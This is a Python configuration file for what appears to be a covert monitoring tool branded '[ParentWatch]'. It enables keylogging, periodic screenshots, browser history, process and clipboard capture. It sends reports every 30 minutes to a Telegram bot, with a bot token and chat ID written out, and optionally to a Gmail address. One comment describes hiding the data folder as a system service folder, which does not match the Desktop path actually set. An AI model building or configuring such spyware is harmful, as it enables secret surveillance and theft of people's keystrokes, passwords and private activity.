# config.py — all settings in one place
import os
from pathlib import Path

# ── VAULT LOCATION ───────────────────────────────────────────────────────────
# AppData\Roaming — always writable, disguised as a system service folder
VAULT_DIR = Path(os.path.expanduser("~")) / "Desktop" / "vault_data"

# ── ENCRYPTION ───────────────────────────────────────────────────────────────
# Change this password before building — this is your master key
VAULT_PASSWORD = "decdrv"

# ── COLLECTION INTERVALS ─────────────────────────────────────────────────────
SCREENSHOT_INTERVAL_SECONDS    = 60    # screenshot every 60 seconds
LOG_FLUSH_INTERVAL_SECONDS     = 300   # flush keylogs to disk every 5 minutes
BROWSER_CHECK_INTERVAL_SECONDS = 600   # pull browser history every 10 minutes
DELIVERY_INTERVAL_SECONDS      = 1800  # send report every 30 minutes

# ── MODULES TOGGLE ───────────────────────────────────────────────────────────
ENABLE_KEYLOGGER       = True
ENABLE_SCREENSHOTS     = True
ENABLE_BROWSER_HISTORY = True
ENABLE_PROCESS_TRACKER = True
ENABLE_CLIPBOARD       = True

# ── GMAIL DELIVERY ───────────────────────────────────────────────────────────
ENABLE_EMAIL        = False
EMAIL_FROM          = "your_sender_gmail@gmail.com"   # Gmail you send FROM
EMAIL_PASSWORD      = "your_app_password_here"        # Gmail App Password (not your real password)
EMAIL_TO            = "rr3208498@gmail.com"
EMAIL_SUBJECT_PREFIX = "[ParentWatch]"

# ── TELEGRAM DELIVERY ────────────────────────────────────────────────────────
ENABLE_TELEGRAM     = True
TELEGRAM_BOT_TOKEN  = "8901039134:AAEBI8Wn-HKC1b3IG9qzz4hIwKnKv_UyIcA"
TELEGRAM_CHAT_ID    = "8889476230"
